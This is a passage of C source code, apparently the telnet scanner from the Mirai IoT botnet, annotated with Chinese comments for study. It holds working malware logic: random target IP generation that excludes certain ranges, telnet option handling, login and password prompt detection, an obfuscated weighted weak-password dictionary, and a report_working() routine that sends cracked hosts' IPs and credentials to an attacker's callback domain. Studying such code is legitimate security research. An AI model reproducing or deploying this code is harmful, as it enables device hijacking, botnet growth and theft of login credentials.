        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}
//	victim希望attacker激活某选项【除了允许协商返回windows size】，其他一律拒绝
//  victim想激活某选项，attacker均接收该选项请求
static int consume_iacs(struct scanner_connection *conn)
{//参考：telnet IAC=>https://stackoverflow.com/questions/10413963/telnet-iac-command-answering
//http://www.tsnien.idv.tw/Internet_WebBook/chap11/11-4%20Telnet%20%E9%80%9A%E8%A8%8A%E5%8D%94%E5%AE%9A.html
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;   //消耗“读取缓冲区“中的数据

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)  //IAC
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)  //读取到0xff ff继续下一轮读取
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd) //读取到0xff fd 【DO】 如果victim愿意
            {
                uint8_t tmp1[3] = {255, 251, 31};   //255 251 31   IAC WILL NAWS
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};   //IAC SB NAWS 80 24 IAC SE【给出终端窗口大小为width*height=80*24】

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)   //如果下一个字符不是0x1f
                    goto iac_wont;

                ptr += 3;           //读取到0xff fd 1f【IAC DO NAWS】=>协商窗口大小
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL); //通过conn->fd发送tmp1、tmp2数据回去。
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:   

                if (!can_consume(conn, ptr, 2))  //一律回答WONT
                    break;

                for (i = 0; i < 3; i++) //遍历前三个字符，把0xfd替换为0xfc，把0xfb替换为0xfd
                {
                    if (ptr[i] == 0xfd)         //DO
                        ptr[i] = 0xfc;          // WONT
                    else if (ptr[i] == 0xfb)   //WILL
                        ptr[i] = 0xfd;      //DO
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);   //发送ptr字符串的前三个字节
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;    // 返回rdbuf消耗到哪里了，返回还未读取的字符的下标
}
//查找shell提示符
static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;   //返回处理到的提示符的下一个字符【也就是prompt_ending】
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)   //conn->rdbuf_pos指向下一个缓冲区空位置，因此conn->rdbuf_pos-1为接收到的最后一个字符，现在查找提示符
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)    //没有找到登录提示符
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)  //返回找到ogin的下一个conn->rdbuf的index
            prompt_ending = tmp;
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)    //没有找到于登录相关的提示符
        return 0;
    else
        return prompt_ending; //找到了登录相关的提示，返回相关字符的下一个conn->rdbuf的index
}

//判断是不是密码输入提示
static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp;

        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
            prompt_ending = tmp;
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);      //ncorrect
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);   
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)  //查找收到的数据中是否有“ncorrect”字段
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;                                          //如果找到ncorrect就返回-1
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);                       //MIRAI: applet not found【如果/bin/busybox找不到这个MIRAI命令就会回显“MIRAI: applet not found”】
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);    //说明大概率是个装了busybox的设备
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

//向auth_table中添加字典数据【弱口令字典】
static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)   //权重范围差
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth)); //每增加一条entry，就用realloc增加堆空间。
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);  //解密之后存储
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;   //范围越大，越容易命中。
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}
//随机返回一条auth_table中的记录
static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);   //随机一个权重值，判断落在哪个【user+passwd】条目中。

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}
//上报成功的扫描结果
static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;
    struct resolv_entries *entries = NULL;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }

    table_unlock_val(TABLE_SCAN_CB_DOMAIN);         //report.changeme.com
    table_unlock_val(TABLE_SCAN_CB_PORT);              //port为0xBB E5=48101

    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));    //解析report.changeme.com，得到对应的ip地址
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[report] Failed to resolve report address\n");
#endif
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];    //随便选一个可用的ip
    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
    resolv_entries_free(entries);

    table_lock_val(TABLE_SCAN_CB_DOMAIN);
    table_lock_val(TABLE_SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)   //向attacker持有的远程report服务器发起connect，报告现在可以登录的主机
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;   //感觉这是一个传输“可登录主机”的标识符
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);            //传输可登录的主机的ip、端口、用户名和密码
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}
//对字典中的字符串进行异或解密
static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0xDE;   //密钥是0xDEADBEEF
        cpy[i] ^= 0xAD;
        cpy[i] ^= 0xBE;
        cpy[i] ^= 0xEF;
    }

    return cpy;
}
 //判断能否从conn->rdbuf中读取amount长度的字符数据
static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

#endif
